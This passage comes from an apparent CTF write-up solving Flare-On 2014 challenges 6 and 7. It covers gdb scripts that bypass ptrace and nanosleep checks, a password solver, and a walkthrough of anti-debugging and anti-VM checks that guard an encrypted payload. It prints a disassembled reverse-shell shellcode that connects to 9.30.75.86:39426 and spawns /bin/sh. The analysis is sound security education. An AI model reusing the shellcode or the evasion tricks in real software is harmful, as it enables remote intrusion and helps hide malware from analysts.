  <td><code>0247</code></td>
  </tr>
  <tr>
  <td>&quot;bad&quot;</td>
  <td>0x1A4</td>
  <td><code>0244</code></td>
  </tr>
  <tr>
  <td>fake SIGSEGV</td>
  <td>0x2329</td>
  <td><code>051</code></td>
  </tr>
  </tbody>
  </table>
</aside>

Now let's come back to the possible debugger check.

On Linux, the most common debugger check is `ptrace(PTRACE_TRACEME, 0, 0, 0)`. A process can have only one tracer. gdb is already the tracer, so this call fails. Then the program knows that a debugger is there. Let's check if our program calls ptrace. In IDA, we can go up from the fake SIGSEGV block that we found before and look at the block that jumps to it:

![Ptrace result check in IDA]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-06-ida-ptrace-check.png' | relative_url }})

It calls `sub_4742B0`. After the call, `shr rax, 3Fh` takes only the top bit of the result, so AL is 1 if the result is negative. If it is not negative, `jz` jumps away and the program continues normally. If it is negative, execution goes to the fake SIGSEGV block.

Let's go inside `sub_4742B0`:

![Ptrace syscall wrapper in IDA]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-06-ida-ptrace-syscall.png' | relative_url }})

IDA shows the syscall as `sys_ptrace`. Under a debugger, it fails and returns -1, so we get the fake segfault. In gdb, we can catch the syscall:

![Ptrace syscall catchpoint in gdb]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-06-gdb-ptrace-catchpoint.png' | relative_url }})

`catch syscall` stops two times: when the syscall starts and when it returns.

Let's look at RAX, continue to the return of the syscall and look at RAX again:

```text
(gdb) p $rax
$1 = -38
(gdb) c

Catchpoint 1 (returned from syscall ptrace), 0x000000000047431b in ?? ()
(gdb) p $rax
$2 = -1
(gdb) set $rax = 0
```

At the start, RAX is `-38` (`-ENOSYS`). At the return, RAX holds the result. Here it is `-1`, so `-EPERM`. We change it to `0`, which means "success," and the program believes it. Now there is no fake segfault. If we continue now, the program only waits, the same as without gdb.

We do not want to do this by hand every time. So let's write it in a file. The name is `bypass.gdb`:

```text
set pagination off
catch syscall ptrace
commands
  silent
  if $rax == -1
    set $rax = 0
  end
  continue
end
```

From now on, we start gdb like this:

```text
gdb -x bypass.gdb ./e7bc5d2c0cf4480348f5504196561297
```

Now we bypassed the debugger check, but there is still one problem. The program prints nothing and waits. Let's press **Ctrl+C** and look at the state:

![Sleeping process backtrace in gdb]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-06-gdb-sleep-backtrace.png' | relative_url }})

`bt` (backtrace) shows the chain of function calls until this point. Each address is a **return address**. The first one, frame #0, is `0x473d50`, the place where the program stopped. Let's go to this address in IDA:

![Nanosleep syscall in IDA]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-06-ida-nanosleep.png' | relative_url }})

The instruction just before `0x473d50` is a `syscall`, and EAX is `0x23` before it. IDA shows it as `sys_nanosleep`. So the program is sleeping inside `nanosleep`.

<aside class="blog-note" aria-label="Note: Did Ctrl+C break the sleep?">
  <p class="blog-note__title">Note · Did Ctrl+C break the sleep?</p>
  <p>No. Signals come between instructions, never in the middle of an instruction. Also, gdb catches the SIGINT itself, and by default it does not send it to the program. The kernel saves the remaining time, and when we continue, the sleep starts again. So we cannot change the time at this point, because the time is inside the kernel. We must catch the sleep at the start.</p>
</aside>

`nanosleep` takes a pointer to `struct timespec { long tv_sec; long tv_nsec; }` in RDI. If we make the seconds zero at the start, the sleep returns immediately. Let's add this to `bypass.gdb`:

```text
catch syscall nanosleep
commands
  silent
  if $rax == -38
    set *(long*)$rdi = 0
  end
  continue
end
```

With the `$rax == -38` condition, we change the value only at the start of the syscall. When we run it again:

![Silent exit after bypassing checks]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-06-gdb-silent-exit.png' | relative_url }})

There is no message, and the code is new: `036` = 30. No `exit()` call in IDA matches this code. So let's catch the exit:

![Exit catchpoint and stack mappings]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-06-gdb-exit-catchpoint.png' | relative_url }})

This is interesting. We can see three things:

- `$pc` is `0x7fffffffca6c`, and this address is inside `[stack]`. The program **runs code on the stack**.
- The stack is `rwxp`. Normally, it is `rw-p`. The binary has an executable stack on purpose.

The first frame outside the stack is #2, `0x44bb2d`. This is a return address, so the instruction just before it, at `0x44BB2B`, is the call that jumps to the stack. Let's look at this part in IDA:

![Decoded stack code call site]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-06-ida-stack-code-call.png' | relative_url }})

Look at the first argument of `sub_401164`: `edi = byte_729900`. This is the buffer that the first-character trick in the big function fills! And a little later, `call rdx` jumps to the code on the stack. So the code on the stack must be related to this buffer. The first characters of all those strings probably build a shellcode in the end.

Let's stop before the jump and look at the code:

![Stack shellcode disassembly in gdb]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-06-gdb-shellcode-disassembly.png' | relative_url }})

The output is in AT&T syntax (`set disassembly-flavor intel` changes it). Here, I write it in Intel syntax. The first block:

```asm
ca40: mov  rax, rdi          ; RAX = RDI
ca43: call ca48              ; "call" the next line
ca48: mov  rbx, [rsp]        ; RBX = ca48
ca4c: add  rbx, 0Ah          ; RBX = ca52
ca50: jmp  ca5c
```

The first instruction copies RDI to RAX, and later the code works with RAX. So what is in RDI? Let's check it:

```text
(gdb) x/s $rdi
0x7fffffffe119:	"abasda"
```

It is our second argument, `argv[2]`. So the shellcode works on our second argument.

The shellcode does not know its address on the stack, so it reads its own address from the return address. At the end, RBX is `ca52`. What is at `ca52`?

```asm
ca52: xor  rdx, rdx
ca55: xor  rax, rax
ca58: mov  al, 3Ch           ; 60 = exit
ca5a: syscall
```

This is the fail block. It also explains our strange exit code. `exit` takes its code from RDI, but the code does not set RDI. RDI still holds the address of the string, so the lowest byte of this address is the exit code. So 30 (036) was not a real exit code. It changes when the address of the string changes.

The rest of the code has the same pattern again and again:

```asm
ca5c: ror  byte ptr [rax], 0F2h   ; change the character
ca5f: cmp  byte ptr [rax], 1Bh    ; compare with the expected value
ca62: je   ca66                   ; equal → continue
ca64: jmp  rbx                    ; not equal → exit
ca66: add  rax, 1                 ; next character
ca6a: xor  byte ptr [rax], 40h
ca6d: xor  byte ptr [rax], 0F2h
ca70: xor  byte ptr [rax], 0B3h
ca73: cmp  byte ptr [rax], 30h
...
```

The code changes each character with some operations and compares it with a constant. So we go backward. We start from the constant and we use the **inverse** operations in **reverse order**.

| Operation | Inverse |
| --------- | ------- |
| `xor k`   | `xor k` |
| `add k`   | `sub k` |
| `sub k`   | `add k` |
| `ror n`   | `rol n` |
| `rol n`   | `ror n` |

**First character:** `ror 0xF2`, then `== 0x1B`. So we take `0x1B` and we use `rol`.

For an 8-bit value, rotating 18 times is the same as rotating `18 % 8 = 2` times.

```text
0x1B  = 0001 1011
rol 2 = 0110 1100 = 0x6C = 'l'
```

**Second character:** three XORs, then `== 0x30`:

```text
0x30 ^ 0xB3 ^ 0xF2 ^ 0x40 = 0x31 = '1'
```

We have `l1` now. We can continue like this, but it is too much work by hand. So let's dump all the code and use Python.

We printed 60 instructions, but 60 was a random number. gdb does not know where the code ends. It continues to disassemble garbage. So we disassemble a big **byte range**, about 1 KB, and look for the end:

```text
(gdb) set logging file sc.txt
(gdb) set logging enabled on
(gdb) disassemble 0x7fffffffca40,+1000
(gdb) set logging enabled off
```

It is easy to see the end of the code. There are many `add %al,(%rax)` lines. In AT&T syntax, this is how `00 00` bytes look. We count the `cmpb` lines and there are **31 checks**. So `argv[2]` has 31 characters.

To get all the characters, I used LLM to write below script (LLMs are so good at these kind of jobs):

```python
import re

def rol(x, n):
    n = (n & 0x1F) % 8
    return ((x << n) | (x >> (8 - n))) & 0xFF

def ror(x, n):
    n = (n & 0x1F) % 8
    return ((x >> n) | (x << (8 - n))) & 0xFF

# The inverse of each operation
inverse = {
    "rorb": rol,
    "rolb": ror,
    "xorb": lambda x, k: x ^ k,
    "addb": lambda x, k: (x - k) & 0xFF,
    "subb": lambda x, k: (x + k) & 0xFF,
}

op_re  = re.compile(r"\s(rorb|rolb|xorb|addb|subb)\s+\$0x([0-9a-f]+),\(%rax\)")
cmp_re = re.compile(r"\scmpb\s+\$0x([0-9a-f]+),\(%rax\)")

result, ops = "", []
for line in open("sc.txt"):
    m = op_re.search(line)
    if m:
        ops.append((m.group(1), int(m.group(2), 16)))
        continue
    m = cmp_re.search(line)
    if m:
        v = int(m.group(1), 16)          # start from the expected value
        for op, k in reversed(ops):      # undo the operations, last one first
            v = inverse[op](v, k)
        result += chr(v)
        ops = []

print(result)
print(len(result), "characters")
```

The script collects the operations of each block. When it finds a `cmpb`, it starts from the expected value. Then it uses the inverse operations from the last one to the first one. The result is the character for that block. The regexes work with AT&T syntax. If you changed to Intel syntax, change it back with `set disassembly-flavor att` before the dump.

![Second argument solver output]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-06-second-argument-solver.png' | relative_url }})

The first two characters are `l1`, the same as our manual result. Good. We found the flag.

```text
l1nhax.hurt.u5.a1l@flare-on.com
```

Before we finish, let's look at the code after the 31 checks:

```text
0x00007fffffffcca7:	xor    %rax,%rax
0x00007fffffffccaa:	xor    %rdi,%rdi
0x00007fffffffccad:	xor    %rsi,%rsi
0x00007fffffffccb0:	xor    %rdx,%rdx
0x00007fffffffccb3:	xor    %r8,%r8
0x00007fffffffccb6:	push   $0x2
0x00007fffffffccb8:	pop    %rdi
0x00007fffffffccb9:	push   $0x1
0x00007fffffffccbb:	pop    %rsi
0x00007fffffffccbc:	push   $0x6
0x00007fffffffccbe:	pop    %rdx
0x00007fffffffccbf:	push   $0x29
0x00007fffffffccc1:	pop    %rax
0x00007fffffffccc2:	syscall
0x00007fffffffccc4:	mov    %rax,%r8
0x00007fffffffccc7:	xor    %rsi,%rsi
0x00007fffffffccca:	xor    %r10,%r10
0x00007fffffffcccd:	push   %r10
0x00007fffffffcccf:	movb   $0x2,(%rsp)
0x00007fffffffccd3:	movw   $0x29a,0x2(%rsp)
0x00007fffffffccda:	movl   $0x564b1e09,0x4(%rsp)
0x00007fffffffcce2:	mov    %rsp,%rsi
0x00007fffffffcce5:	push   $0x10
0x00007fffffffcce7:	pop    %rdx
0x00007fffffffcce8:	push   %r8
0x00007fffffffccea:	pop    %rdi
0x00007fffffffcceb:	push   $0x2a
0x00007fffffffcced:	pop    %rax
0x00007fffffffccee:	syscall
0x00007fffffffccf0:	xor    %rsi,%rsi
0x00007fffffffccf3:	push   $0x3
0x00007fffffffccf5:	pop    %rsi
0x00007fffffffccf6:	dec    %rsi
0x00007fffffffccf9:	push   $0x21
0x00007fffffffccfb:	pop    %rax
0x00007fffffffccfc:	syscall
0x00007fffffffccfe:	jne    0x7fffffffccf6
0x00007fffffffcd00:	xor    %rdi,%rdi
0x00007fffffffcd03:	push   %rdi
0x00007fffffffcd04:	push   %rdi
0x00007fffffffcd05:	pop    %rsi
0x00007fffffffcd06:	pop    %rdx
0x00007fffffffcd07:	movabs $0x68732f6e69622f2f,%rdi
0x00007fffffffcd11:	shr    $0x8,%rdi
0x00007fffffffcd15:	push   %rdi
0x00007fffffffcd16:	push   %rsp
0x00007fffffffcd17:	pop    %rdi
0x00007fffffffcd18:	push   $0x3b
0x00007fffffffcd1a:	pop    %rax
0x00007fffffffcd1b:	syscall
0x00007fffffffcd1d:	nop
0x00007fffffffcd1e:	jmp    0x7fffffffcd20
```

It has only syscalls. The syscall number is in RAX, and the arguments are in RDI, RSI, RDX and R10:

| RAX       | Syscall   | Arguments           | What it does                                   |
| --------- | --------- | ------------------- | ---------------------------------------------- |
| 0x29 (41) | `socket`  | 2, 1, 6             | Opens a TCP socket (AF_INET, SOCK_STREAM, TCP) |
| 0x2a (42) | `connect` | socket, address, 16 | Connects to a remote host                      |
| 0x21 (33) | `dup2`    | socket, 2 → 1 → 0   | Sends stderr, stdout and stdin to the socket   |
| 0x3b (59) | `execve`  | "/bin/sh", 0, 0     | Starts a shell                                 |

The address is built on the stack as a `sockaddr_in` structure:

```asm
movb    $0x2,(%rsp)             ; AF_INET
movw    $0x29a,0x2(%rsp)        ; port
movl    $0x564b1e09,0x4(%rsp)   ; IP address
```

x86 is little-endian, so we read the bytes in reverse order. The port is `0x029a` → `9a 02` = **39426**, and the IP is `0x564b1e09` → `09 1e 4b 56` = **9.30.75.86**.

So with the correct password, this is a **reverse shell** to `9.30.75.86:39426`. Do not test it on a machine with internet access.

## Challenge 7

{: #challenge-7}

Before IDA, let's take a first look with Detect It Easy:

![Challenge seven executable identification]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-executable-identification.png' | relative_url }})

This one is a 32-bit PE file and a normal Visual Studio 2010 console program. But one line is red:

```text
(Heur)Packer: Compressed or packed data[High entropy + Section 2 (".data") compressed]
```

DiE sees that the `.data` section has very high entropy. Random-looking data has high entropy, and encrypted data looks random. Also look at the file size: 1.10 MiB for a small console program is a lot. So there is probably a big encrypted thing inside `.data`. Keep this in mind, we will find it soon.

Let's start.

### First look at `_main`

{: #first-look-at-\_main}

We open the file in IDA and we go to `_main`. The start of the function looks like this:

![Overlapping call instruction in IDA]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-ida-overlapping-call.png' | relative_url }})

Look at the red address at `0x401B0F`. IDA shows a `call` to `0E8401B14h`. This address is not inside the program. Something is wrong here, so let's look closer.

```text
.text:00401B06    mov     eax, 64h
.text:00401B0B    test    eax, eax
.text:00401B0D    jnz     short near ptr loc_401B0F+4
```

`eax` is `0x64`, so it is never zero. This means `jnz` is always taken. It looks like a condition, but the result is always the same. We call this an **opaque predicate**.

Now look at the target: `loc_401B0F+4`. This is `0x401B13`. `0x401B13` is not the start of an instruction in IDA's listing. It is inside the `call` instruction that IDA shows at `0x401B0F`.

The bytes are the same, but the start point is different. The CPU does not know where an instruction starts. It only takes the address in EIP and decodes the bytes from there. A disassembler must guess these start points. So if we start one byte earlier or later, the same bytes become different instructions. Let's look at the raw bytes from 0x401B0F to 0x401B17 and read them in two ways.

#### IDA's view

The `jnz` ends at `0x401B0F`. So for IDA, the next instruction starts at `0x401B0F`, and it decodes from there:

```text
401B0F:  E8 00 00 00 E8    call 0E8401B14h    (5 bytes)
401B14:  18 F5             sbb  ch, dh        (2 bytes)
401B16:  FF FF             dw   0FFFFh        (IDA cannot decode it)
```

#### CPU's view

The `jnz` is always taken, so the CPU never runs the code at `0x401B0F`. It jumps to `0x401B13` and decodes from there:

```text
401B13:  E8 18 F5 FF FF    call sub_401030    (5 bytes)
401B18:  E8 ...            call sub_4010C0
```

<aside class="blog-note" aria-label="Note: How do these bytes become instructions?">
  <p class="blog-note__title">Note · How do these bytes become instructions?</p>
  <p>We can decode a <code>call</code> by hand. <code>E8</code> is the opcode of <code>call rel32</code>, and the next 4 bytes are the offset in little-endian. The target is the address of the next instruction plus this offset.</p>
  <table>
  <thead>
  <tr>
  <th></th>
  <th>IDA (starts at 0x401B0F)</th>
  <th>CPU (starts at 0x401B13)</th>
  </tr>
  </thead>
  <tbody>
  <tr>
  <td>Bytes</td>
  <td><code>E8 00 00 00 E8</code></td>
  <td><code>E8 18 F5 FF FF</code></td>
  </tr>
  <tr>
  <td>Offset (little-endian)</td>
  <td><code>0xE8000000</code></td>
  <td><code>0xFFFFF518</code> = <code>-0xAE8</code></td>
  </tr>
  <tr>
  <td>Next instruction</td>
  <td><code>0x401B0F + 5 = 0x401B14</code></td>
  <td><code>0x401B13 + 5 = 0x401B18</code></td>
  </tr>
  <tr>
  <td>Target</td>
  <td><code>0x401B14 + 0xE8000000 = 0xE8401B14</code></td>
  <td><code>0x401B18 - 0xAE8 = 0x401030</code></td>
  </tr>
  </tbody>
  </table>
</aside>

Now let's put the two views on top of the same bytes:

```text
address:   401B0F  401B10  401B11  401B12  401B13  401B14  401B15  401B16  401B17
bytes:       E8      00      00      00      E8      18      F5      FF      FF

IDA:       [ call 0E8401B14h                  ][ sbb ch, dh   ][ dw 0FFFFh    ]
CPU:        (never runs)                       [ call sub_401030                  ]
```

To fix the listing in IDA, we put the cursor on `0x401B0F` and press `U` (undefine). Then we go to `0x401B13` and press `C` (make code). Now IDA shows the real `call sub_401030`, and the four bytes from `0x401B0F` to `0x401B12` stay as data. We can make these data bytes nops so that IDA can decompile this function.

So this is a classic **anti-disassembly** trick: an opaque predicate (a jump that always jumps) plus a jump into the middle of an instruction.

After the fix and decompilation process, the listing looks much better:

![Repaired main pseudocode in IDA]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-ida-main.png' | relative_url }})

Now we can see the real start of `_main`. It calls many functions one after another. We see a long list of calls at the top, a small loop in the middle and some file work at the end. We will come back to this screenshot many times.

### The encrypted blob

{: #the-encrypted-blob}

#### sub_401030: the first layer

Let's jump to `sub_401030`:

![First XOR layer pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-ida-first-xor-layer.png' | relative_url }})

IDA uses two nice names here: `Buffer` and `ElementCount`. You may ask: where do they come from? Look at the end of `_main`: these two variables go to `fwrite(Buffer, 1u, ElementCount, v7)`, so IDA takes the parameter names of `fwrite`. In the file, `Buffer` is `byte_4131F8` and `ElementCount` is `dword_519438`.

Let's read the screenshot from top to bottom.

```c
v0 = IsDebuggerPresent();
```

The function asks Windows: "Is a debugger attached?" `v0` is TRUE or FALSE.

```c
v1 = ElementCount;
v2 = 0;
```

`v1` is the size of `Buffer`, and `v2` is the loop counter (the index in `Buffer`).

```c
if ( !v0 )
{
    if ( ElementCount )
    {
        do
        {
            Buffer[v2] ^= byte_413060[v2 % 0x13];
            ++v2;
        }
        while ( v2 < v1 );
    }
    return 1;
}
```

If there is **no** debugger, the function XORs every byte of `Buffer` with the key at `byte_413060`. `0x13` is 19, so the key is 19 bytes long. The `if ( ElementCount )` is only a safety check: if the size is 0, there is nothing to do.

```c
if ( !ElementCount )
    return 1;
do
{
    Buffer[v2] ^= byte_413074[v2 % 0xD];
    ++v2;
}
while ( v2 < v1 );
return 1;
```

If there **is** a debugger, we reach this part. It is the same loop, but with another key at `byte_413074`. `0xD` is 13, so this key is 13 bytes long.

| Branch      | Key           | Key length      |
| ----------- | ------------- | --------------- |
| No debugger | `byte_413060` | 0x13 = 19 bytes |
| Debugger    | `byte_413074` | 0xD = 13 bytes  |

The important point is this: with a debugger, the program does not crash and it does not show an error. It only uses the wrong key. We get garbage and we do not know it.

Now, how big is `Buffer`? Let's double-click `ElementCount` in the pseudocode. IDA jumps to its place in `.data`:

```asm
.data:00519438 dword_519438    dd 106240h
```

`0x106240` is 1,073,728 bytes, about 1 MB. A 1 MB encrypted blob that is decrypted at the start is almost always an **embedded payload**. Probably it is a second executable.

#### sub_4010C0: PEB.BeingDebugged

![PEB debugger check pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-ida-peb-debugger-check.png' | relative_url }})

This function asks the same question as `sub_401030`, but in another way. It does not call an API. It reads the `BeingDebugged` byte from the PEB directly:

```c
v1 = NtCurrentPeb()->BeingDebugged == 1;
if ( v1 )
    sub_401000(dword_4130A8);   // debugger
else
    sub_401000(dword_4130A4);   // no debugger
```

<aside class="blog-note" aria-label="Note: What is the PEB?">
  <p class="blog-note__title">Note · What is the PEB?</p>
  <p>The Process Environment Block is a structure that Windows keeps for every process. In 32-bit code, its address is at <code>fs:[30h]</code>, and <code>BeingDebugged</code> is at offset 2. <code>IsDebuggerPresent</code> reads exactly this byte. So if we hook or patch the API, this check still sees the debugger.</p>
</aside>

Here the XOR is not in the function itself. It is inside the helper `sub_401000`. Let's open it:

![Repeating key XOR helper pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-ida-xor-helper.png' | relative_url }})

Look at the first line. This is a `__usercall` function, so it does not use a normal calling convention. IDA shows where each parameter comes from:

| Parameter | Comes in |
| --------- | -------- |
| `a1`      | `ebx`    |
| `a2`      | `esi`    |
| `a3`      | stack    |

The decompiler of `sub_4010C0` shows only the stack argument. But in the graph view, we can see all three arguments before the `call`:

![PEB debugger check graph]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-ida-peb-debugger-branches.png' | relative_url }})

Let's read the two blocks:

```asm
; debugger (red arrow)                    ; no debugger (green arrow)
mov  eax, dword_4130A8                    mov  ecx, dword_4130A4
push eax                ; a3 = length     push ecx              ; a3 = length
mov  ebx, offset aUnacceptable            mov  ebx, offset aOmglob
mov  esi, offset byte_4131F8              mov  esi, offset byte_4131F8
call sub_401000                           call sub_401000
```

| Argument                 | Debugger                 | No debugger              |
| ------------------------ | ------------------------ | ------------------------ |
| `a1` (`ebx`), the key    | `"UNACCEPTABLE!"`        | `"omglob"`               |
| `a2` (`esi`), the data   | `byte_4131F8` (`Buffer`) | `byte_4131F8` (`Buffer`) |
| `a3` (stack), the length | `dword_4130A8`           | `dword_4130A4`           |

So the two keys are not random bytes. They are strings. With a debugger, the program literally says "UNACCEPTABLE!" and uses this text as the wrong key.

The loop looks strange, but it is simple repeating-key XOR:

```c
for ( i = 0; i < ElementCount; i++ )
    a2[i] ^= a1[i % a3];      // Buffer[i] ^= key[i % len]
```

So `sub_401000` is only a shared helper for repeating-key XOR, and the caller chooses the key and its length.

#### sub_401130: the red pill

![SIDT virtual machine check pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-ida-sidt-check.png' | relative_url }})

`__sidt(v4)` runs the `sidt` instruction. It writes 6 bytes into memory: first the 2-byte **limit** of the Interrupt Descriptor Table (IDT), then its 4-byte **base address**.

You may ask: where is the base address in the pseudocode? Look at the stack comments of the two variables:

```c
char v4[2]; // [ebp-8h]
int v5;     // [ebp-6h]
```

`sidt` starts writing at `v4` (`ebp-8`). `v4` is only 2 bytes, and `v5` starts right after it:

```text
ebp-8  ebp-7 | ebp-6  ebp-5  ebp-4  ebp-3
   limit     |        base address
    v4       |            v5
```

So `v5` is the full 32-bit IDT base address, and `v5 & 0xFF000000` takes its top byte:

```c
if ( (v5 & 0xFF000000) != 0xFF000000 )
    Buffer[v2] ^= byte_4130AC[v2 % 0xD];   // 13 bytes
else
    Buffer[v2] ^= byte_4130BC[v2 % 0xE];   // 14 bytes
```

This is the famous **red pill** trick. On some old virtual machines, the IDT was moved to a high address, so its top byte was `0xFF`. So if the top byte is not `0xFF`, the program thinks it runs on real hardware and it uses the first key.

#### sub_4011D0: the VMware backdoor

![VMware backdoor check pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-ida-vmware-check.png' | relative_url }})

`__indword(0x5658u)` is an `in` instruction on port `0x5658`. This is the "backdoor" port of VMware. Inside a VMware guest, VMware answers this call and writes the magic value `VMXh` into `ebx`. IDA shows `ebx` as `a1`:

```c
if ( a1 == 1447909480 )            // VMware
    Buffer[v1++] ^= byte_413081;
else                               // not VMware
    Buffer[v1++] ^= byte_413073;
```

`1447909480` is `0x564D5868`, and these bytes are `'V' 'M' 'X' 'h'`. Also look at the key: it is only **one byte**, not an array.

#### sub_4012A0: OutputDebugString and the last error

![Debug string error check pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-ida-debug-string-check.png' | relative_url }})

```c
SetLastError(0x1234u);
OutputDebugStringW(L"bah!");
LastError = GetLastError();
if ( LastError != 4660 )                       // 4660 = 0x1234
    Buffer[v2] ^= byte_4130DC[v2 % 0x1B];      // 27 bytes
else
    Buffer[v2] ^= byte_4130F8[v2 % 0x1C];      // 28 bytes
```

The program sets the last error to `0x1234`, and then it sends the string "bah!" to the debugger. The old idea is this: without a debugger, `OutputDebugString` fails and changes the last error. With a debugger, the call works and the last error stays `0x1234`. So `!= 0x1234` means "no debugger". But this behavior is different on newer Windows versions, so this check is not very reliable today.

#### sub_401350: counting breakpoints

![Software breakpoint counting pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-ida-breakpoint-count.png' | relative_url }})

```c
v1 = sub_401030;
do {
    if ( *(_BYTE *)v1 == 0xCC )
        ++v0;
    v1 = (char *)v1 + 1;
} while ( v1 < sub_401780 );

if ( v0 == 85 )
    Buffer[i] ^= byte_41311C[i % 0x1A];   // 26 bytes
else
    Buffer[v3] ^= byte_413138[v3 % 0x11]; // 17 bytes
```

The function reads the program's own code, byte by byte, from `sub_401030` to `sub_401780`, and it counts the `0xCC` bytes. `0xCC` is `int3`, the software breakpoint instruction. When we set a breakpoint in a debugger, the debugger writes a `0xCC` into the code.

In the code, we see that the count decides the key: if it is exactly 85 (`0x55`), the function uses `byte_41311C`. If it is anything else, it uses `byte_413138`. If we set a software breakpoint in these functions, the count changes, and we get the wrong key.

#### sub_4013F0: PEB.NtGlobalFlag

![PEB global flag check pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-ida-global-flag-check.png' | relative_url }})

```c
v1 = NtCurrentPeb()->NtGlobalFlag == 112;   // 0x70
if ( v1 )
    sub_401000(dword_41317C);   // debugger
else
    sub_401000(dword_413178);   // no debugger
```

The PEB again. When a debugger **starts** a process, Windows turns on three heap debug flags in `NtGlobalFlag`:

| Flag                           | Value        |
| ------------------------------ | ------------ |
| `FLG_HEAP_ENABLE_TAIL_CHECK`   | `0x10`       |
| `FLG_HEAP_ENABLE_FREE_CHECK`   | `0x20`       |
| `FLG_HEAP_VALIDATE_PARAMETERS` | `0x40`       |
| Total                          | `0x70` = 112 |

Like `sub_4010C0`, it uses the helper `sub_401000`. So again, the decompiler does not show the keys, and we look at the graph view:

![PEB global flag branch graph]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-ida-global-flag-branches.png' | relative_url }})

| Argument                 | No debugger (red arrow)  | Debugger (green arrow)             |
| ------------------------ | ------------------------ | ---------------------------------- |
| `a1` (`ebx`), the key    | `unk_413154`             | `"Feel the sting of the Monarch!"` |
| `a2` (`esi`), the data   | `byte_4131F8` (`Buffer`) | `byte_4131F8` (`Buffer`)           |
| `a3` (stack), the length | `dword_413178`           | `dword_41317C`                     |

Be careful with the colors here. This time the check is `jnz`, so the green arrow (jump taken) is the "debugger" branch. In `sub_4010C0` it was the opposite.

With a debugger, the program again uses a string as the wrong key: "Feel the sting of the Monarch!". Without a debugger, the key is `unk_413154`.

#### sub_401460: is it Friday?

![Friday date check pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-ida-friday-check.png' | relative_url }})

```c
_time64(&Time);
if ( _localtime64(&Time)->tm_wday == 5 )
    Buffer[i] ^= byte_413180[i % 9];     // 9 bytes
else
    Buffer[v4] ^= byte_41318C[v4 & 3];   // 4 bytes
```

`tm_wday` starts with Sunday = 0, so 5 is **Friday**. This check has nothing to do with debuggers. The program simply wants to run on a Friday.

#### sub_4014F0: the right file name

![Executable filename check pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-ida-filename-check.png' | relative_url }})

```c
if ( !strcmp(a1, aBackdogeExe) )
    Buffer[i] ^= byte_413198[i % 0xC];   // 12 bytes
else
    Buffer[v2] ^= byte_4131A4[v2 & 0xF]; // 16 bytes
```

What is `a1`? In the `_main` pseudocode, line 18 is `sub_4014F0(*argv);`. So `a1` is `argv[0]`. The string `aBackdogeExe` is **"backdoge.exe"**.

So the program must run with the name `backdoge.exe`. This name is exactly 12 characters. Remember this number, we will see it again very soon.

#### sub_401590: the IP of dogecoin.com

![Dogecoin DNS address check pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-ida-dogecoin-dns-check.png' | relative_url }})

```c
WSAStartup(0x202u, &WSAData);
v0 = gethostbyname("www.dogecoin.com");
if ( v0->h_addrtype != 2 )
    Buffer[i] ^= byte_4131CC[i % 0xC];                 // 12 bytes
...
if ( !strcmp(inet_ntoa(...h_addr_list...), "127.0.0.1") )
    Buffer[v2] ^= byte_4131CC[v2 % 0xC];               // 12 bytes
else
    Buffer[v5] ^= byte_4131BC[v5 & 0xF];               // 16 bytes
```

The program asks DNS for the IP of `www.dogecoin.com` and compares the first address with `127.0.0.1`. If it is `127.0.0.1`, or if the answer is not IPv4 (`h_addrtype` 2 is `AF_INET`), the function uses `byte_4131CC` (12 bytes). Otherwise, it uses `byte_4131BC` (16 bytes).

You may ask: which one is the correct key? From the code alone, we cannot know. On the real internet, `www.dogecoin.com` does not point to localhost, and we would need to change the hosts file for that. But nothing in the code tells us that the author wants this. So we leave this question open for now. Our brute force will answer it later.

First `backdoge.exe`, now `dogecoin.com`. The author really likes this dog.

#### sub_4016F0: is it 17:00?

![Local hour check pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-ida-hour-check.png' | relative_url }})

The same idea as `sub_401460`, but with the hour:

```c
if ( _localtime64(&Time)->tm_hour == 17 )
    Buffer[i] ^= byte_4131E0[i % 9];     // 9 bytes
else
    Buffer[v4] ^= byte_4131EC[v4 & 1];   // 2 bytes
```

So the program wants a Friday, between 17:00 and 17:59.

#### A layer with the program's own name

In the middle of `_main`, between `sub_4016F0` and `sub_4017A0`, there is a small loop:

```c
v4 = ElementCount;
v5 = *argv;
for ( i = 0; i < v4; ++i )
    Buffer[i] ^= v5[i % 0xC];
```

`*argv` is `argv[0]`, and `0xC` is 12. So the key of this layer is the first 12 characters of `argv[0]`.

`argv[0]` is the name we use to start the program. So the program decrypts correctly only with one special 12-byte name. If we rename the file, or we start it with a full path, we get garbage again.

Which name? We already know it from `sub_4014F0`: `backdoge.exe`, exactly 12 characters.

#### sub_4017A0: the IP of e.root-servers.net

![Root server DNS key pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-ida-root-server-key.png' | relative_url }})

This one is different. There is no `if/else` with two keys. The key comes from the network:

```c
strcpy(name, "e.root-servers.net");
result = gethostbyname(name);
if ( result ) {
    v1 = inet_ntoa(...h_addr_list...);   // IP as text
    v2 = strlen(v1);
    v3 = ElementCount;
    for ( i = 0; i < v3; byte_4131F7[i] ^= v1[v5] ) {
        v5 = i % v2;
        ++i;
    }
}
```

